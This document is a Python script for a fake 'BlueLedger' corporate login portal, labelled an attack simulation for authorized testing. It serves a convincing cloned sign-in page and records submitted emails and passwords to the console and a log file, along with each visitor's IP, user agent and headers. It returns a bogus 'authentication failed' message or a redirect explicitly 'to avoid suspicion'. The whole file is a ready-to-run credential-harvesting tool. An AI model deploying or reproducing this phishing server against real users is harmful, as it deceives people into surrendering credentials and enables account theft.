#!/usr/bin/env python3
"""
BlueLedger Captive Portal Attack Simulation
===========================================
Creates a fake BlueLedger login portal to capture credentials
For authorized security testing only!
"""

import http.server
import socketserver
import json
import ssl
from datetime import datetime
from urllib.parse import parse_qs, urlparse
import argparse
import os
import sys

class BlueLedgerCaptivePortal(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {format % args}")
    
    def do_GET(self):
        """Handle GET requests - serve fake login page"""
        
        # Parse the URL
        parsed_url = urlparse(self.path)
        
        # Serve the fake BlueLedger login page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        
        # Realistic BlueLedger login page
        fake_login_page = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BlueLedger - Corporate Authentication Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #333;
            font-size: 28px;
            font-weight: 700;
        }
        
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input[type="email"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .login-btn:hover {
            transform: translateY(-1px);
        }
        
        .security-notice {
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
        }
        
        .security-notice small {
            color: #666;
            font-size: 12px;
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e1e5e9;
        }
        
        .divider span {
            background: white;
            padding: 0 15px;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🔷 BlueLedger</h1>
            <p>Corporate Authentication Portal</p>
        </div>
        
        <form method="POST" action="/api/auth/login" id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required 
                       placeholder="Enter your corporate email">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password">
            </div>
            
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        
        <div class="divider">
            <span>Secure Connection</span>
        </div>
        
        <div class="security-notice">
            <small>
                🔒 This is a secure corporate login portal.<br>
                Your credentials are protected by enterprise-grade encryption.
            </small>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Add loading state
            const btn = document.querySelector('.login-btn');
            btn.innerHTML = 'Authenticating...';
            btn.disabled = true;
        });
    </script>
</body>
</html>"""
        
        self.wfile.write(fake_login_page.encode())
    
    def do_POST(self):
        """Handle POST requests - capture credentials"""
        
        if '/api/auth/login' in self.path:
            # Get the posted data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            
            # Parse form data or JSON
            credentials = {}
            try:
                if self.headers.get('Content-Type') == 'application/json':
                    credentials = json.loads(post_data)
                else:
                    parsed_data = parse_qs(post_data)
                    credentials = {k: v[0] if v else '' for k, v in parsed_data.items()}
            except:
                credentials = {'raw_data': post_data}
            
            # Capture data structure
            capture_data = {
                'timestamp': datetime.now().isoformat(),
                'source_ip': self.client_address[0],
                'source_port': self.client_address[1],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'referer': self.headers.get('Referer', 'Unknown'),
                'credentials': credentials,
                'headers': dict(self.headers),
                'method': self.command,
                'path': self.path
            }
            
            # Display capture
            print("\n" + "="*60)
            print("🚨 CREDENTIAL CAPTURE DETECTED 🚨")
            print("="*60)
            print(f"📍 Source: {capture_data['source_ip']}:{capture_data['source_port']}")
            print(f"📧 Email: {credentials.get('email', 'N/A')}")
            print(f"🔑 Password: {credentials.get('password', 'N/A')}")
            print(f"🌐 User-Agent: {capture_data['user_agent'][:80]}...")
            print(f"🔗 Referer: {capture_data['referer']}")
            print(f"⏰ Time: {capture_data['timestamp']}")
            print("="*60)
            
            # Save to log file
            log_file = '/tmp/captive_portal_captures.log'
            try:
                with open(log_file, 'a') as f:
                    f.write(json.dumps(capture_data, indent=2) + '\n')
                print(f"💾 Logged to: {log_file}")
            except Exception as e:
                print(f"❌ Failed to log: {e}")
            
            # Send realistic response
            if credentials.get('email') and credentials.get('password'):
                # Simulate authentication delay
                import time
                time.sleep(1)
                
                # Send "authentication failed" response to avoid suspicion
                self.send_response(401)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                error_response = {
                    'success': False,
                    'message': 'Authentication failed. Please check your credentials.',
                    'code': 'INVALID_CREDENTIALS'
                }
                
                self.wfile.write(json.dumps(error_response).encode())
            else:
                # Redirect to legitimate site to avoid suspicion
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        else:
            # Handle other POST requests
            self.send_response(404)
            self.end_headers()

class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Handle requests in separate threads."""
    allow_reuse_address = True

def create_ssl_context(cert_file, key_file):
    """Create SSL context for HTTPS"""
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(cert_file, key_file)
    return context

def main():
    parser = argparse.ArgumentParser(description='BlueLedger Captive Portal Attack Simulation')
    parser.add_argument('--port', type=int, default=80, help='Port to run on (default: 80)')
    parser.add_argument('--https-port', type=int, default=443, help='HTTPS port (default: 443)')
    parser.add_argument('--ssl-cert', help='SSL certificate file')
    parser.add_argument('--ssl-key', help='SSL private key file')
    parser.add_argument('--interface', default='0.0.0.0', help='Interface to bind to')
    parser.add_argument('--log-file', default='/tmp/captive_portal_captures.log', help='Log file path')
    
    args = parser.parse_args()
    
    print("BlueLedger Captive Portal Attack Simulation")
    print("=" * 50)
    print("⚠️  WARNING: For authorized security testing only!")
    print("   Only use on networks you own or have permission to test.")
    print()
    
    # Check if running as root for low ports
    if args.port < 1024 or args.https_port < 1024:
        if os.geteuid() != 0:
            print("❌ Error: Root privileges required for ports < 1024")
            print(f"   Try: sudo {' '.join(sys.argv)}")
            sys.exit(1)
    
    try:
        # Start HTTP server
        httpd = ThreadingHTTPServer((args.interface, args.port), BlueLedgerCaptivePortal)
        print(f"🌐 HTTP Server started on {args.interface}:{args.port}")
        
        # Start HTTPS server if certificates provided
        if args.ssl_cert and args.ssl_key:
            if os.path.exists(args.ssl_cert) and os.path.exists(args.ssl_key):
                try:
                    httpsd = ThreadingHTTPServer((args.interface, args.https_port), BlueLedgerCaptivePortal)
                    httpsd.socket = create_ssl_context(args.ssl_cert, args.ssl_key).wrap_socket(
                        httpsd.socket, server_side=True
                    )
                    print(f"🔒 HTTPS Server started on {args.interface}:{args.https_port}")
                    
                    # Run both servers
                    import threading
                    https_thread = threading.Thread(target=httpsd.serve_forever)
                    https_thread.daemon = True
                    https_thread.start()
                except Exception as e:
                    print(f"⚠️  HTTPS setup failed: {e}")
            else:
                print(f"⚠️  SSL certificate files not found")
        
        print(f"📝 Logging to: {args.log_file}")
        print()
        print("🎯 Target devices will see a realistic BlueLedger login portal")
        print("📊 Captured credentials will be displayed and logged")
        print("🛑 Press Ctrl+C to stop")
        print()
        
        # Start HTTP server
        httpd.serve_forever()
        
    except KeyboardInterrupt:
        print("\n🛑 Stopping captive portal...")
        httpd.shutdown()
        print("✅ Attack stopped")
    except PermissionError:
        print(f"❌ Permission denied. Try running with sudo for port {args.port}")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()